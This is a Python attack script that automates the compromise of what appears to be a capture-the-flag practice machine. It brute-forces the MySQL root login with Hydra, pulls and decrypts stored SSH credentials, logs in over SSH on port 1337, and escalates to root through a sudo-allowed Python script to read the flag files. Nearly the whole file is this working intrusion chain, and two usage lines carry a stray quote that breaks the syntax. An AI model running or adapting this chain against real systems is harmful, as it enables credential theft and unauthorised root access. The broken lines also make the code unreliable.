#!/usr/bin/python3

# credits to Isid0r3 and Jedidia
# linkedIn: https://www.linkedin.com/in/isid0r3
# linkedIn: https://linkedin.com/in/jedidia-d-bahena-0814161b7

import sys
import getopt
import os
import subprocess
import re
import mysql.connector
from cryptography.fernet import Fernet
import paramiko
import time
import select
import animation


def main(argv):
    try:
        opts, args = getopt.getopt(argv, 'i:p:w:', ['address_ip=', 'port=', 'wordlist='])
        
        # Check if the number of options is correct
        if len(opts) != 3:
            print(f'usage: {sys.argv[0]} -i <address_ip> -p <port> -w <wordlist>')
            sys.exit(2)
        
        # Initialize default variables
        ip = None
        port = None
        wordlist = None

        # Iterate through options and assign appropriate values
        for opt, arg in opts:
            if opt in ('-i', '--address_ip'):
                ip = arg
            elif opt in ('-p', '--port'):
                port = arg
            elif opt in ('-w', '--wordlist'):
                wordlist = arg
        
        # Check if the IP address, port, and wordlist were provided
        if ip and port and wordlist:
            
            login, password = brute_force_mysql(ip, port, wordlist)
            print(f'login = {login}')
            print(f'password = {password}\n')
            user_ssh, ssh_pwd = connection_mysql(ip, port, login, password)

            print(f"user_ssh = {user_ssh}")
            print(f"ssh_pwd = {ssh_pwd}\n")
            ssh_login(user_ssh, ssh_pwd, ip)

        else:
            print(f'usage: {sys.argv[0]} -i <address_ip> -p <port> -w <wordlist>'')
            sys.exit(2)

    except getopt.GetoptError:
        print(f'usage: {sys.argv[0]} -i <address_ip> -p <port> -w <wordlist>'')
        sys.exit(2)

@animation.simple_wait
def brute_force_mysql(ip, port, wordlist):

    try:
        print("++++++Brute forcing the MySQL service in progress+++++++++")
        print("Depending on the size of the wordlist this step may take a while\n")
        
        # Execute the Hydra command
        result = subprocess.run(
            ['hydra', '-l', 'root', '-P', f'{wordlist}', f'mysql://{ip}:{port}', '-I'],
            capture_output=True, text=True, check=True
        )

        # Filter login and password information
        login_password_pattern = re.compile(r'\[3306\]\[mysql\] host: .+?\s+login:\s+(\S+)\s+password:\s+(\S+)')
        match = login_password_pattern.search(result.stdout)

        if match:
            login, password = match.groups()
            return login, password
            
        else:
            print('No login and password found.')

    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e.stderr}")

def connection_mysql(ip, port, login, password):
    print("++++++ Connecting to the database and retrieving the content of the data table +++++++++\n")
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host=ip,
            user=login,
            password=password,
            database='data'
        )

        cursor = connection.cursor()

        # Execute the SELECT command to get the values of cred and keyy
        cursor.execute("SELECT cred, keyy FROM fernet;")
        rows = cursor.fetchall()

        
        for row in rows:
            cred, keyy = row
            return fernet_decrypt(cred, keyy)
    except mysql.connector.Error as err:
        print(f"Error: {err}")

    finally:
        if connection.is_connected():
            cursor.close()
            connection.close()

def fernet_decrypt(cred, keyy):

    fernet = Fernet(keyy.encode())
    creds = fernet.decrypt(cred.encode())
    user_ssh = creds.decode('utf-8').split(":")[0]
    ssh_pwd = creds.decode('utf-8').split(":")[1]
    return user_ssh, ssh_pwd

def ssh_login(user_ssh, ssh_pwd, ip):
    print("++++++ SSH connection via port 1337 +++++++++\n")
    port = 1337

    try:
        # Create an SSH client object
        client = paramiko.SSHClient()

        # Automatically add unknown host keys
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the SSH server
        client.connect(ip, port, user_ssh, ssh_pwd)
        print(f"Successfully connected to {ip} via port {port}.\n")
        print("++++++ Retrieving the user flag +++++++++\n")
        channel = client.invoke_shell()
        time.sleep(1)

        command = "cat local.txt\n"
        channel.send(command)
        time.sleep(1)
        

        output = ""
        while channel.recv_ready():
            output += channel.recv(1024).decode()

        lines = output.splitlines()
        for line in lines:
            if "local.txt" in line:
                local_index = lines.index(line)
                user_flag = lines[local_index + 1]
                print(f"User flag: {user_flag}\n")
                break

        
        print("++++++ Privilege escalation and retrieving the root flag +++++++++\n")
        command = "sudo /usr/bin/python2 /opt/exp.py\n"
        channel.send(command)
        time.sleep(1)

        command = "import pty; pty.spawn(\"/bin/bash\")\n"
        channel.send(command)
        time.sleep(3)

        command = "cat /root/proof.txt\n"
        channel.send(command)
        time.sleep(1)
        


        output = ""
        while channel.recv_ready():
            output += channel.recv(65535).decode()

        # Extract the line containing the key
        lines = output.splitlines()
        for line in lines:
            if "proof.txt" in line:
                proof_index = lines.index(line)
                root_flag = lines[proof_index + 1]
                print(f"Root flag: {root_flag}\n")
                break
    
        

    except paramiko.AuthenticationException:
        print("Authentication failed, check your credentials")
    except paramiko.SSHException as sshException:
        print(f"SSH connection error: {sshException}")
    except Exception as e:
        print(f"Unknown error: {e}")
    finally:
        # Close the connection
        client.close()


if __name__ == "__main__":
    main(sys.argv[1:])
